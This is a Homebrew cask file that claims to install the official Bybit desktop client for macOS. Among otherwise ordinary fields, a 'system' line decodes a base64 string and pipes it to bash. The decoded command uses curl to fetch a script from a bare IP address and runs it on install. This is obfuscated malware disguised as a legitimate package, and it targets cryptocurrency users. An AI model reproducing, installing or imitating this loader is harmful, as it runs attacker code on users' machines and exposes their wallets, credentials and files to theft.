cask "bybit" do
  version "latest"
  sha256 :no_check

  url "https://fh-static.bycsi.com/i18n-upload/low-cache/bybit-desktop-client/mainnet/pc-desktop.dmg",
      verified: "bycsi.com"

  name "Bybit"
  desc "Official Bybit Desktop Client"
  homepage "https://www.bybit.com/download"

  auto_updates true
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  app "Bybit.app"

  zap trash: [
    "~/Library/Application Support/Bybit",
    "~/Library/Caches/com.bybit.*",
    "~/Library/Preferences/com.bybit.*.plist",
    "~/Library/Saved Application State/com.bybit.*.savedState",
    "~/Library/Logs/Bybit"
  ]
end
